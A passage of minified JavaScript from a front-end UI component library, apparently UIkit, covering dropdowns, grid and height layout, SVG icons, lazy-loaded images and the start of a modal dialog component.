                name: "beforescroll",
                handler: function() {
                    this.hide(!1)
                }
            }, {
                name: "toggle",
                self: !0,
                handler: function(t, e) {
                    t.preventDefault(), this.isToggled() ? this.hide(!1) : this.show(e, !1)
                }
            }, {
                name: Bt,
                filter: function() {
                    return b(this.mode, "hover")
                },
                handler: function(t) {
                    Mi(t) || (Ri && Ri !== this && Ri.toggle && b(Ri.toggle.mode, "hover") && !Tt(t.target, Ri.toggle.$el) && !J({
                        x: t.pageX,
                        y: t.pageY
                    }, Je(Ri.$el)) && Ri.hide(!1), t.preventDefault(), this.show(this.toggle))
                }
            }, {
                name: "toggleshow",
                handler: function(t, e) {
                    e && !b(e.target, this.$el) || (t.preventDefault(), this.show(e || this.toggle))
                }
            }, {
                name: "togglehide " + zt,
                handler: function(t, e) {
                    Mi(t) || e && !b(e.target, this.$el) || (t.preventDefault(), this.toggle && b(this.toggle.mode, "hover") && this.hide())
                }
            }, {
                name: "beforeshow",
                self: !0,
                handler: function() {
                    this.clearTimers(), Xe.cancel(this.$el), this.position()
                }
            }, {
                name: "show",
                self: !0,
                handler: function() {
                    this.tracker.init(), jt(this.$el, "updatearia"),
                        function() {
                            if (qi) return;
                            qi = !0, Ht(document, Ot, function(t) {
                                var e, i = t.target,
                                    n = t.defaultPrevented;
                                if (!n)
                                    for (; Ri && Ri !== e && !Tt(i, Ri.$el) && (!Ri.toggle || !Tt(i, Ri.toggle.$el));)(e = Ri).hide(!1)
                            })
                        }()
                }
            }, {
                name: "beforehide",
                self: !0,
                handler: function() {
                    this.clearTimers()
                }
            }, {
                name: "hide",
                handler: function(t) {
                    var e = t.target;
                    this.$el === e ? (Ri = this.isActive() ? null : Ri, jt(this.$el, "updatearia"), this.tracker.cancel()) : Ri = null === Ri && Tt(e, this.$el) && this.isToggled() ? this : Ri
                }
            }, {
                name: "updatearia",
                self: !0,
                handler: function(t, e) {
                    t.preventDefault(), this.updateAria(this.$el), (e || this.toggle) && (Q((e || this.toggle).$el, "aria-expanded", this.isToggled() ? "true" : "false"), Ee(this.toggle.$el, this.cls, this.isToggled()))
                }
            }],
            update: {
                write: function() {
                    this.isToggled() && !Xe.inProgress(this.$el) && this.position()
                },
                events: ["resize"]
            },
            methods: {
                show: function(e, i) {
                    var n = this;
                    void 0 === i && (i = !0);
                    var r = function() {
                            return !n.isToggled() && n.toggleElement(n.$el, !0)
                        },
                        t = function() {
                            if (n.toggle = e || n.toggle, n.clearTimers(), !n.isActive())
                                if (i && Ri && Ri !== n && Ri.isDelaying) n.showTimer = setTimeout(n.show, 10);
                                else {
                                    if (n.isParentOf(Ri)) {
                                        if (!Ri.hideTimer) return;
                                        Ri.hide(!1)
                                    } else if (Ri && n.isChildOf(Ri)) Ri.clearTimers();
                                    else if (Ri && !n.isChildOf(Ri) && !n.isParentOf(Ri))
                                        for (var t; Ri && Ri !== t && !n.isChildOf(Ri);)(t = Ri).hide(!1);
                                    i && n.delayShow ? n.showTimer = setTimeout(r, n.delayShow) : r(), Ri = n
                                }
                        };
                    e && this.toggle && e.$el !== this.toggle.$el ? (Lt(this.$el, "hide", t), this.hide(!1)) : t()
                },
                hide: function(t) {
                    var e = this;
                    void 0 === t && (t = !0);
                    var i = function() {
                        return e.toggleNow(e.$el, !1)
                    };
                    this.clearTimers(), this.isDelaying = this.tracker.movesTo(this.$el), t && this.isDelaying ? this.hideTimer = setTimeout(this.hide, this.hoverIdle) : t && this.delayHide ? this.hideTimer = setTimeout(i, this.delayHide) : i()
                },
                clearTimers: function() {
                    clearTimeout(this.showTimer), clearTimeout(this.hideTimer), this.showTimer = null, this.hideTimer = null, this.isDelaying = !1
                },
                isActive: function() {
                    return Ri === this
                },
                isChildOf: function(t) {
                    return t && t !== this && Tt(this.$el, t.$el)
                },
                isParentOf: function(t) {
                    return t && t !== this && Tt(t.$el, this.$el)
                },
                position: function() {
                    Ie(this.$el, this.clsDrop + "-(stack|boundary)"), De(this.$el, {
                        top: "",
                        left: "",
                        display: "block"
                    }), Ee(this.$el, this.clsDrop + "-boundary", this.boundaryAlign);
                    var t = Je(this.boundary),
                        e = this.boundaryAlign ? t : Je(this.toggle.$el);
                    if ("justify" === this.align) {
                        var i = "y" === this.getAxis() ? "width" : "height";
                        De(this.$el, i, e[i])
                    } else this.$el.offsetWidth > Math.max(t.right - e.left, e.right - t.left) && ke(this.$el, this.clsDrop + "-stack");
                    this.positionAt(this.$el, this.boundaryAlign ? this.boundary : this.toggle.$el, this.boundary), De(this.$el, "display", "")
                }
            }
        };
    var Ji = {
            extends: Gi
        },
        Zi = {
            mixins: [Li],
            args: "target",
            props: {
                target: Boolean
            },
            data: {
                target: !1
            },
            computed: {
                input: function(t, e) {
                    return be($t, e)
                },
                state: function() {
                    return this.input.nextElementSibling
                },
                target: function(t, e) {
                    var i = t.target;
                    return i && (!0 === i && this.input.parentNode === e && this.input.nextElementSibling || nt(i, e))
                }
            },
            update: function() {
                var t = this.target,
                    e = this.input;
                if (t) {
                    var i, n = It(t) ? "value" : "textContent",
                        r = t[n],
                        o = e.files && e.files[0] ? e.files[0].name : pt(e, "select") && (i = ye("option", e).filter(function(t) {
                            return t.selected
                        })[0]) ? i.textContent : e.value;
                    r !== o && (t[n] = o)
                }
            },
            events: {
                change: function() {
                    this.$emit()
                }
            }
        },
        Qi = {
            update: {
                read: function(t) {
                    var e = hi(this.$el);
                    if (!e || t.isInView === e) return !1;
                    t.isInView = e
                },
                write: function() {
                    this.$el.src = this.$el.src
                },
                events: ["scroll", "resize"]
            }
        },
        tn = {
            props: {
                margin: String,
                firstColumn: Boolean
            },
            data: {
                margin: "uk-margin-small-top",
                firstColumn: "uk-first-column"
            },
            update: {
                read: function(t) {
                    var e = this.$el.children;
                    if (!e.length || !kt(this.$el)) return t.rows = [
                        []
                    ];
                    t.rows = en(e), t.stacks = !t.rows.some(function(t) {
                        return 1 < t.length
                    })
                },
                write: function(t) {
                    var n = this;
                    t.rows.forEach(function(t, i) {
                        return t.forEach(function(t, e) {
                            Ee(t, n.margin, 0 !== i), Ee(t, n.firstColumn, 0 === e)
                        })
                    })
                },
                events: ["resize"]
            }
        };

    function en(t) {
        for (var e = [
                []
            ], i = 0; i < t.length; i++) {
            var n = t[i],
                r = nn(n);
            if (r.height)
                for (var o = e.length - 1; 0 <= o; o--) {
                    var s = e[o];
                    if (!s[0]) {
                        s.push(n);
                        break
                    }
                    var a = void 0;
                    if (a = s[0].offsetParent === n.offsetParent ? nn(s[0]) : (r = nn(n, !0), nn(s[0], !0)), r.top >= a.bottom - 1) {
                        e.push([n]);
                        break
                    }
                    if (r.bottom > a.top) {
                        if (r.left < a.left && !Ct) {
                            s.unshift(n);
                            break
                        }
                        s.push(n);
                        break
                    }
                    if (0 === o) {
                        e.unshift([n]);
                        break
                    }
                }
        }
        return e
    }

    function nn(t, e) {
        var i;
        void 0 === e && (e = !1);
        var n = t.offsetTop,
            r = t.offsetLeft,
            o = t.offsetHeight;
        return e && (n = (i = ui(t))[0], r = i[1]), {
            top: n,
            left: r,
            height: o,
            bottom: n + o
        }
    }
    var rn = {
        extends: tn,
        mixins: [Li],
        name: "grid",
        props: {
            masonry: Boolean,
            parallax: Number
        },
        data: {
            margin: "uk-grid-margin",
            clsStack: "uk-grid-stack",
            masonry: !1,
            parallax: 0
        },
        computed: {
            length: function(t, e) {
                return e.children.length
            },
            parallax: function(t) {
                var e = t.parallax;
                return e && this.length ? Math.abs(e) : ""
            }
        },
        connected: function() {
            this.masonry && ke(this.$el, "uk-flex-top uk-flex-wrap-top")
        },
        update: [{
            read: function(t) {
                var r = t.rows;
                (this.masonry || this.parallax) && (r = r.map(function(t) {
                    return U(t, "offsetLeft")
                }), Ct && r.map(function(t) {
                    return t.reverse()
                }));
                var e, i, n, o, s, a = r.some(function(t) {
                        return t.some(Ve.inProgress)
                    }),
                    h = !1,
                    l = "";
                if (this.masonry && this.length) {
                    var c = 0;
                    h = r.reduce(function(i, t, n) {
                        return i[n] = t.map(function(t, e) {
                            return 0 === n ? 0 : P(i[n - 1][e]) + (c - P(r[n - 1][e] && r[n - 1][e].offsetHeight))
                        }), c = t.reduce(function(t, e) {
                            return Math.max(t, e.offsetHeight)
                        }, 0), i
                    }, []), s = r, l = Math.max.apply(Math, s.reduce(function(i, t) {
                        return t.forEach(function(t, e) {
                            return i[e] = (i[e] || 0) + t.offsetHeight
                        }), i
                    }, [])) + (e = this.$el, i = this.margin, n = L(e.children), P((o = n.filter(function(t) {
                        return Te(t, i)
                    })[0]) ? De(o, "marginTop") : De(n[0], "paddingLeft")) * (r.length - 1))
                }
                return {
                    rows: r,
                    translates: h,
                    height: !a && l
                }
            },
            write: function(t) {
                var e = t.stacks,
                    i = t.height;
                Ee(this.$el, this.clsStack, e), De(this.$el, "paddingBottom", this.parallax), !1 !== i && De(this.$el, "height", i)
            },
            events: ["resize"]
        }, {
            read: function(t) {
                var e = t.height;
                return {
                    scrolled: !!this.parallax && li(this.$el, e ? e - ti(this.$el) : 0) * this.parallax
                }
            },
            write: function(t) {
                var e = t.rows,
                    n = t.scrolled,
                    r = t.translates;
                (!1 !== n || r) && e.forEach(function(t, i) {
                    return t.forEach(function(t, e) {
                        return De(t, "transform", n || r ? "translateY(" + ((r && -r[i][e]) + (n ? e % 2 ? n : n / 8 : 0)) + "px)" : "")
                    })
                })
            },
            events: ["scroll", "resize"]
        }]
    };
    var on = Et ? {
            data: {
                selMinHeight: !1,
                forceHeight: !1
            },
            computed: {
                elements: function(t, e) {
                    var i = t.selMinHeight;
                    return i ? ye(i, e) : [e]
                }
            },
            update: [{
                read: function() {
                    De(this.elements, "height", "")
                },
                order: -5,
                events: ["resize"]
            }, {
                write: function() {
                    var i = this;
                    this.elements.forEach(function(t) {
                        var e = P(De(t, "minHeight"));
                        e && (i.forceHeight || Math.round(e + ni("height", t, "content-box")) >= t.offsetHeight) && De(t, "height", e)
                    })
                },
                order: 5,
                events: ["resize"]
            }]
        } : {},
        sn = {
            mixins: [on],
            args: "target",
            props: {
                target: String,
                row: Boolean
            },
            data: {
                target: "> *",
                row: !0,
                forceHeight: !0
            },
            computed: {
                elements: function(t, e) {
                    return ye(t.target, e)
                }
            },
            update: {
                read: function() {
                    return {
                        rows: (this.row ? en(this.elements) : [this.elements]).map(an)
                    }
                },
                write: function(t) {
                    t.rows.forEach(function(t) {
                        var i = t.heights;
                        return t.elements.forEach(function(t, e) {
                            return De(t, "minHeight", i[e])
                        })
                    })
                },
                events: ["resize"]
            }
        };

    function an(t) {
        var e;
        if (t.length < 2) return {
            heights: [""],
            elements: t
        };
        var i = hn(t),
            n = i.heights,
            r = i.max,
            o = t.some(function(t) {
                return t.style.minHeight
            }),
            s = t.some(function(t, e) {
                return !t.style.minHeight && n[e] < r
            });
        return o && s && (De(t, "minHeight", ""), e = hn(t), n = e.heights, r = e.max), {
            heights: n = t.map(function(t, e) {
                return n[e] === r && P(t.style.minHeight).toFixed(2) !== r.toFixed(2) ? "" : r
            }),
            elements: t
        }
    }

    function hn(t) {
        var e = t.map(function(t) {
            return Je(t).height - ni("height", t, "content-box")
        });
        return {
            heights: e,
            max: Math.max.apply(null, e)
        }
    }
    var ln = {
        mixins: [on],
        props: {
            expand: Boolean,
            offsetTop: Boolean,
            offsetBottom: Boolean,
            minHeight: Number
        },
        data: {
            expand: !1,
            offsetTop: !1,
            offsetBottom: !1,
            minHeight: 0
        },
        update: {
            read: function() {
                var t = "",
                    e = ni("height", this.$el, "content-box");
                if (this.expand) t = ti(window) - (cn(document.documentElement) - cn(this.$el)) - e || "";
                else {
                    if (t = "calc(100vh", this.offsetTop) {
                        var i = Je(this.$el).top;
                        t += i < ti(window) / 2 ? " - " + i + "px" : ""
                    }!0 === this.offsetBottom ? t += " - " + cn(this.$el.nextElementSibling) + "px" : D(this.offsetBottom) ? t += " - " + this.offsetBottom + "vh" : this.offsetBottom && u(this.offsetBottom, "px") ? t += " - " + P(this.offsetBottom) + "px" : _(this.offsetBottom) && (t += " - " + cn(nt(this.offsetBottom, this.$el)) + "px"), t += (e ? " - " + e + "px" : "") + ")"
                }
                return {
                    minHeight: t
                }
            },
            write: function(t) {
                var e = t.minHeight;
                De(this.$el, {
                    minHeight: e
                }), this.minHeight && P(De(this.$el, "minHeight")) < this.minHeight && De(this.$el, "minHeight", this.minHeight)
            },
            events: ["resize"]
        }
    };

    function cn(t) {
        return t && t.offsetHeight || 0
    }
    var un = {},
        dn = {
            args: "src",
            props: {
                id: String,
                icon: String,
                src: String,
                style: String,
                width: Number,
                height: Number,
                ratio: Number,
                class: String
            },
            data: {
                ratio: 1,
                id: !1,
                exclude: ["ratio", "src", "icon"],
                class: ""
            },
            connected: function() {
                var t, h = this;
                if (this.class += " uk-svg", !this.icon && b(this.src, "#")) {
                    var e = this.src.split("#");
                    1 < e.length && (t = e, this.src = t[0], this.icon = t[1])
                }
                this.svg = this.getSvg().then(function(t) {
                    var e;
                    if (!(e = _(t) ? (h.icon && b(t, "<symbol") && (t = function(t, e) {
                            if (!pn[t]) {
                                var i;
                                for (pn[t] = {}; i = fn.exec(t);) pn[t][i[3]] = '<svg xmlns="http://www.w3.org/2000/svg"' + i[1] + "svg>";
                                fn.lastIndex = 0
                            }
                            return pn[t][e]
                        }(t, h.icon) || t), be(t.substr(t.indexOf("<svg")))) : t.cloneNode(!0))) return Xt.reject("SVG not found.");
                    var i = Q(e, "viewBox");
                    for (var n in i && (i = i.split(" "), h.width = h.$props.width || i[2], h.height = h.$props.height || i[3]), h.width *= h.ratio, h.height *= h.ratio, h.$options.props) h[n] && !b(h.exclude, n) && Q(e, n, h[n]);
                    h.id || et(e, "id"), h.width && !h.height && et(e, "height"), h.height && !h.width && et(e, "width");
                    var r = h.icon || h.src;
                    Q(e, "data-svg", r);
                    var o = h.$el;
                    if (xt(o) || "CANVAS" === o.tagName) {
                        Q(o, {
                            hidden: !0,
                            id: null
                        });
                        var s = o.nextElementSibling;
                        r === Q(s, "data-svg") ? e = s : le(o, e)
                    } else {
                        var a = o.lastElementChild;
                        r === Q(a, "data-svg") ? e = a : ae(o, e)
                    }
                    return h.svgEl = e
                }, K)
            },
            disconnected: function() {
                var e = this;
                xt(this.$el) && Q(this.$el, {
                    hidden: null,
                    id: this.id || null
                }), this.svg && this.svg.then(function(t) {
                    return (!e._connected || t !== e.svgEl) && ue(t)
                }, K), this.svg = this.svgEl = null
            },
            methods: {
                getSvg: function() {
                    var i = this;
                    return this.src ? (un[this.src] || (un[this.src] = new Xt(function(e, t) {
                        v(i.src, "data:") ? e(decodeURIComponent(i.src.split(",")[1])) : te(i.src).then(function(t) {
                            return e(t.response)
                        }, function() {
                            return t("SVG not found.")
                        })
                    })), un[this.src]) : Xt.reject()
                }
            }
        },
        fn = /<symbol(.*?id=(['"])(.*?)\2[^]*?<\/)symbol>/g,
        pn = {};
    var mn = {},
        gn = {
            spinner: '<svg width="30" height="30" viewBox="0 0 30 30" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" cx="15" cy="15" r="14"/></svg>',
            totop: '<svg width="18" height="10" viewBox="0 0 18 10" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.2" points="1 9 9 1 17 9 "/></svg>',
            marker: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect x="9" y="4" width="1" height="11"/><rect x="4" y="9" width="11" height="1"/></svg>',
            "close-icon": '<svg width="14" height="14" viewBox="0 0 14 14" xmlns="http://www.w3.org/2000/svg"><line fill="none" stroke="#000" stroke-width="1.1" x1="1" y1="1" x2="13" y2="13"/><line fill="none" stroke="#000" stroke-width="1.1" x1="13" y1="1" x2="1" y2="13"/></svg>',
            "close-large": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><line fill="none" stroke="#000" stroke-width="1.4" x1="1" y1="1" x2="19" y2="19"/><line fill="none" stroke="#000" stroke-width="1.4" x1="19" y1="1" x2="1" y2="19"/></svg>',
            "navbar-toggle-icon": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect y="9" width="20" height="2"/><rect y="3" width="20" height="2"/><rect y="15" width="20" height="2"/></svg>',
            "overlay-icon": '<svg width="40" height="40" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg"><rect x="19" y="0" width="1" height="40"/><rect x="0" y="19" width="40" height="1"/></svg>',
            "pagination-next": '<svg width="7" height="12" viewBox="0 0 7 12" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.2" points="1 1 6 6 1 11"/></svg>',
            "pagination-previous": '<svg width="7" height="12" viewBox="0 0 7 12" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.2" points="6 1 1 6 6 11"/></svg>',
            "search-icon": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.1" cx="9" cy="9" r="7"/><path fill="none" stroke="#000" stroke-width="1.1" d="M14,14 L18,18 L14,14 Z"/></svg>',
            "search-large": '<svg width="40" height="40" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.8" cx="17.5" cy="17.5" r="16.5"/><line fill="none" stroke="#000" stroke-width="1.8" x1="38" y1="39" x2="29" y2="30"/></svg>',
            "search-navbar": '<svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.1" cx="10.5" cy="10.5" r="9.5"/><line fill="none" stroke="#000" stroke-width="1.1" x1="23" y1="23" x2="17" y2="17"/></svg>',
            "slidenav-next": '<svg width="14px" height="24px" viewBox="0 0 14 24" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.4" points="1.225,23 12.775,12 1.225,1 "/></svg>',
            "slidenav-next-large": '<svg width="25px" height="40px" viewBox="0 0 25 40" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="2" points="4.002,38.547 22.527,20.024 4,1.5 "/></svg>',
            "slidenav-previous": '<svg width="14px" height="24px" viewBox="0 0 14 24" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.4" points="12.775,1 1.225,12 12.775,23 "/></svg>',
            "slidenav-previous-large": '<svg width="25px" height="40px" viewBox="0 0 25 40" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="2" points="20.527,1.5 2,20.024 20.525,38.547 "/></svg>'
        },
        vn = {
            install: function(r) {
                r.icon.add = function(t, e) {
                    var i, n = _(t) ? ((i = {})[t] = e, i) : t;
                    q(n, function(t, e) {
                        gn[e] = t, delete mn[e]
                    }), r._initialized && we(document.body, function(t) {
                        return q(r.getComponents(t), function(t) {
                            t.$options.isIcon && t.icon in n && t.$reset()
                        })
                    })
                }
            },
            attrs: ["icon", "ratio"],
            mixins: [Li, dn],
            args: "icon",
            props: ["icon"],
            data: {
                exclude: ["id", "style", "class", "src", "icon", "ratio"]
            },
            isIcon: !0,
            connected: function() {
                ke(this.$el, "uk-icon")
            },
            methods: {
                getSvg: function() {
                    var t, e = function(t) {
                        if (!gn[t]) return null;
                        mn[t] || (mn[t] = be(gn[t].trim()));
                        return mn[t]
                    }((t = this.icon, Ct ? Y(Y(t, "left", "right"), "previous", "next") : t));
                    return e ? Xt.resolve(e) : Xt.reject("Icon not found.")
                }
            }
        },
        wn = {
            extends: vn,
            data: function(t) {
                return {
                    icon: m(t.constructor.options.name)
                }
            }
        },
        bn = {
            extends: wn,
            connected: function() {
                ke(this.$el, "uk-slidenav")
            },
            computed: {
                icon: function(t, e) {
                    var i = t.icon;
                    return Te(e, "uk-slidenav-large") ? i + "-large" : i
                }
            }
        },
        yn = {
            extends: wn,
            computed: {
                icon: function(t, e) {
                    var i = t.icon;
                    return Te(e, "uk-search-icon") && vt(e, ".uk-search-large").length ? "search-large" : vt(e, ".uk-search-navbar").length ? "search-navbar" : i
                }
            }
        },
        xn = {
            extends: wn,
            computed: {
                icon: function() {
                    return "close-" + (Te(this.$el, "uk-close-large") ? "large" : "icon")
                }
            }
        },
        kn = {
            extends: wn,
            connected: function() {
                var e = this;
                this.svg.then(function(t) {
                    return 1 !== e.ratio && De(be("circle", t), "strokeWidth", 1 / e.ratio)
                }, K)
            }
        };
    var $n = {
        props: {
            dataSrc: String,
            dataSrcset: Boolean,
            sizes: String,
            width: Number,
            height: Number,
            offsetTop: String,
            offsetLeft: String,
            target: String
        },
        data: {
            dataSrc: "",
            dataSrcset: !1,
            sizes: !1,
            width: !1,
            height: !1,
            offsetTop: "50vh",
            offsetLeft: 0,
            target: !1
        },
        computed: {
            cacheKey: function(t) {
                var e = t.dataSrc;
                return this.$name + "." + e
            },
            width: function(t) {
                var e = t.width,
                    i = t.dataWidth;
                return e || i
            },
            height: function(t) {
                var e = t.height,
                    i = t.dataHeight;
                return e || i
            },
            sizes: function(t) {
                var e = t.sizes,
                    i = t.dataSizes;
                return e || i
            },
            isImg: function(t, e) {
                return Dn(e)
            },
            target: {
                get: function(t) {
                    var e = t.target;
                    return [this.$el].concat(rt(e, this.$el))
                },
                watch: function() {
                    this.observe()
                }
            },
            offsetTop: function(t) {
                return An(t.offsetTop, "height")
            },
            offsetLeft: function(t) {
                return An(t.offsetLeft, "width")
            }
        },
        connected: function() {
            Bn[this.cacheKey] ? In(this.$el, Bn[this.cacheKey] || this.dataSrc, this.dataSrcset, this.sizes) : this.isImg && this.width && this.height && In(this.$el, function(t, e, i) {
                var n;
                i && (n = Z.ratio({
                    width: t,
                    height: e
                }, "width", An(Tn(i))), t = n.width, e = n.height);
                return 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="' + t + '" height="' + e + '"></svg>'
            }(this.width, this.height, this.sizes)), this.observer = new Ni(this.load, {
                rootMargin: this.offsetTop + "px " + this.offsetLeft + "px"
            }), requestAnimationFrame(this.observe)
        },
        disconnected: function() {
            this.observer.disconnect()
        },
        update: {
            read: function(t) {
                var e = this,
                    i = t.image;
                if (i || "complete" !== document.readyState || this.load(this.observer.takeRecords()), this.isImg) return !1;
                i && i.then(function(t) {
                    return t && "" !== t.currentSrc && In(e.$el, On(t))
                })
            },
            write: function(t) {
                if (this.dataSrcset && 1 !== window.devicePixelRatio) {
                    var e = De(this.$el, "backgroundSize");
                    (e.match(/^(auto\s?)+$/) || P(e) === t.bgSize) && (t.bgSize = (i = this.dataSrcset, n = this.sizes, r = An(Tn(n)), (o = (i.match(Nn) || []).map(P).sort(function(t, e) {
                        return t - e
                    })).filter(function(t) {
                        return r <= t
                    })[0] || o.pop() || ""), De(this.$el, "backgroundSize", t.bgSize + "px"))
                }
                var i, n, r, o
            },
            events: ["resize"]
        },
        methods: {
            load: function(t) {
                var e = this;
                t.some(function(t) {
                    return t.isIntersecting
                }) && (this._data.image = ee(this.dataSrc, this.dataSrcset, this.sizes).then(function(t) {
                    return In(e.$el, On(t), t.srcset, t.sizes), Bn[e.cacheKey] = On(t), t
                }, K), this.observer.disconnect())
            },
            observe: function() {
                var e = this;
                !this._data.image && this._connected && this.target.forEach(function(t) {
                    return e.observer.observe(t)
                })
            }
        }
    };

    function In(t, e, i, n) {
        if (Dn(t)) n && (t.sizes = n), i && (t.srcset = i), e && (t.src = e);
        else if (e) {
            !b(t.style.backgroundImage, e) && (De(t, "backgroundImage", "url(" + bt(e) + ")"), jt(t, Wt("load", !1)))
        }
    }
    var Sn = /\s*(.*?)\s*(\w+|calc\(.*?\))\s*(?:,|$)/g;

    function Tn(t) {
        var e, i;
        for (Sn.lastIndex = 0; e = Sn.exec(t);)
            if (!e[1] || window.matchMedia(e[1]).matches) {
                e = v(i = e[2], "calc") ? i.substring(5, i.length - 1).replace(En, function(t) {
                    return An(t)
                }).replace(/ /g, "").match(Cn).reduce(function(t, e) {
                    return t + +e
                }, 0) : i;
                break
            }
        return e || "100vw"
    }
    var En = /\d+(?:\w+|%)/g,
        Cn = /[+-]?(\d+)/g;

    function An(t, e, i) {
        return void 0 === e && (e = "width"), void 0 === i && (i = window), D(t) ? +t : u(t, "vw") ? Mn(i, "width", t) : u(t, "vh") ? Mn(i, "height", t) : u(t, "%") ? Mn(i, e, t) : P(t)
    }
    var Nn = /\s+\d+w\s*(?:,|$)/g;
    var _n = {
        height: ti,
        width: ei
    };

    function Mn(t, e, i) {
        return _n[e](t) * P(i) / 100
    }

    function Dn(t) {
        return "IMG" === t.tagName
    }

    function On(t) {
        return t.currentSrc || t.src
    }
    var Bn, zn = "__test__";
    try {
        (Bn = window.sessionStorage || {})[zn] = 1, delete Bn[zn]
    } catch (t) {
        Bn = {}
    }
    var Pn = {
        props: {
            media: Boolean
        },
        data: {
            media: !1
        },
        computed: {
            matchMedia: function() {
                var t = function(t) {
                    if (_(t))
                        if ("@" === t[0]) {
                            var e = "breakpoint-" + t.substr(1);
                            t = P(Pe(e))
                        } else if (isNaN(t)) return t;
                    return !(!t || isNaN(t)) && "(min-width: " + t + "px)"
                }(this.media);
                return !t || window.matchMedia(t).matches
            }
        }
    };
    var Hn, Fn, Ln = {
            mixins: [Li, Pn],
            props: {
                fill: String
            },
            data: {
                fill: "",
                clsWrapper: "uk-leader-fill",
                clsHide: "uk-leader-hide",
                attrFill: "data-fill"
            },
            computed: {
                fill: function(t) {
                    return t.fill || Pe("leader-fill-content")
                }
            },
            connected: function() {
                var t;
                t = fe(this.$el, '<span class="' + this.clsWrapper + '">'), this.wrapper = t[0]
            },
            disconnected: function() {
                pe(this.wrapper.childNodes)
            },
            update: {
                read: function(t) {
                    var e = t.changed,
                        i = t.width,
                        n = i;
                    return {
                        width: i = Math.floor(this.$el.offsetWidth / 2),
                        changed: e || n !== i,
                        hide: !this.matchMedia
                    }
                },
                write: function(t) {
                    Ee(this.wrapper, this.clsHide, t.hide), t.changed && (t.changed = !1, Q(this.wrapper, this.attrFill, new Array(t.width).join(this.fill)))
                },
                events: ["resize"]
            }
        },
        jn = {
            props: {
                container: Boolean
            },
            data: {
                container: !0
            },
            computed: {
                container: function(t) {
                    var e = t.container;
                    return !0 === e && this.$container || e && be(e)
                }
            }
        },
        Wn = {
            mixins: [Li, jn, ji],
            props: {
                selPanel: String,
                selClose: String,
                escClose: Boolean,
                bgClose: Boolean,
                stack: Boolean
            },
            data: {
                cls: "uk-open",
                escClose: !0,
                bgClose: !0,
                overlay: !0,
                stack: !1
            },
            computed: {
                panel: function(t, e) {
                    return be(t.selPanel, e)
                },
                transitionElement: function() {
                    return this.panel
                },
                bgClose: function(t) {
                    return t.bgClose && this.panel
                }
            },
            beforeDisconnect: function() {
                this.isToggled() && this.toggleNow(this.$el, !1)
            },
            events: [{
                name: "click",
                delegate: function() {
                    return this.selClose
                },
                handler: function(t) {
                    t.preventDefault(), this.hide()
                }
            }, {
                name: "toggle",
                self: !0,
                handler: function(t) {
                    t.defaultPrevented || (t.preventDefault(), this.toggle())
                }
            }, {
                name: "beforeshow",
                self: !0,
                handler: function(t) {
                    var i = Hn && Hn !== this && Hn;
                    Hn = this, i ? this.stack ? this.prev = i : ((Hn = i).isToggled() ? i.hide().then(this.show) : Lt(i.$el, "beforeshow hidden", this.show, !1, function(t) {
                        var e = t.target;
                        return "hidden" === t.type && e === i.$el
                    }), t.preventDefault()) : function() {
                        if (Fn) return;
                        Fn = [Ht(document, Ot, function(t) {
                            var e = t.target,
                                i = t.defaultPrevented;
                            !Hn || !Hn.bgClose || i || Hn.overlay && !Tt(e, Hn.$el) || Tt(e, Hn.panel) || Hn.hide()
                        }), Ht(document, "keydown", function(t) {
                            27 === t.keyCode && Hn && Hn.escClose && (t.preventDefault(), Hn.hide())
                        })]
                    }()
                }
            }, {
                name: "show",
                self: !0,
                handler: function() {
                    Te(document.documentElement, this.clsPage) || (this.scrollbarWidth = ei(window) - ei(document), De(document.body, "overflowY", this.scrollbarWidth && this.overlay ? "scroll" : "")), ke(document.documentElement, this.clsPage)
                }
            }, {
                name: "hide",
                self: !0,
                handler: function() {
                    Hn && (Hn !== this || this.prev) || (Fn && Fn.forEach(function(t) {
                        return t()
                    }), Fn = null)
                }
            }, {
                name: "hidden",
                self: !0,
                handler: function() {
                    var t, e = this.prev;
                    if (Hn = Hn && Hn !== this && Hn || e)
                        for (; e;) {
                            if (e.clsPage === this.clsPage) {
                                t = !0;
                                break
                            }
                            e = e.prev
                        } else De(document.body, "overflowY", "");
                    t || $e(document.documentElement, this.clsPage)
                }
            }],
            methods: {
                toggle: function() {
                    return this.isToggled() ? this.hide() : this.show()
                },
                show: function() {
                    var e = this;
                    return this.isToggled() ? Xt.resolve() : this.container && this.$el.parentNode !== this.container ? (ae(this.container, this.$el), new Xt(function(t) {
                        return requestAnimationFrame(function() {
                            return e.show().then(t)
                        })
                    })) : this.toggleElement(this.$el, !0, Vn(this))
                },
                hide: function() {
                    return this.isToggled() ? this.toggleElement(this.$el, !1, Vn(this)) : Xt.resolve()
                },
                getActive: function() {
                    return Hn
                }
            }
        };

    function Vn(t) {
        var r = t.transitionElement,
            o = t._toggle;
        return function(i, n) {
            return new Xt(function(t, e) {
                return Lt(i, "show hide", function() {
                    i._reject && i._reject(), i._reject = e, o(i, n), W(De(r, "transitionDuration")) ? Lt(r, "transitionend", t, !1, function(t) {
                        return t.target === r
                    }) : t()
                })
            })
        }
    }
    var Yn = {
        install: function(a) {
            a.modal.dialog = function(t, e) {
                var n = a.modal(' <div class="uk-modal"> <div class="uk-modal-dialog">' + t + "</div> </div> ", e);
                return n.show(), Ht(n.$el, "hidden", function(t) {
                    var e = t.target,
                        i = t.currentTarget;
                    e === i && Xt.resolve(function() {
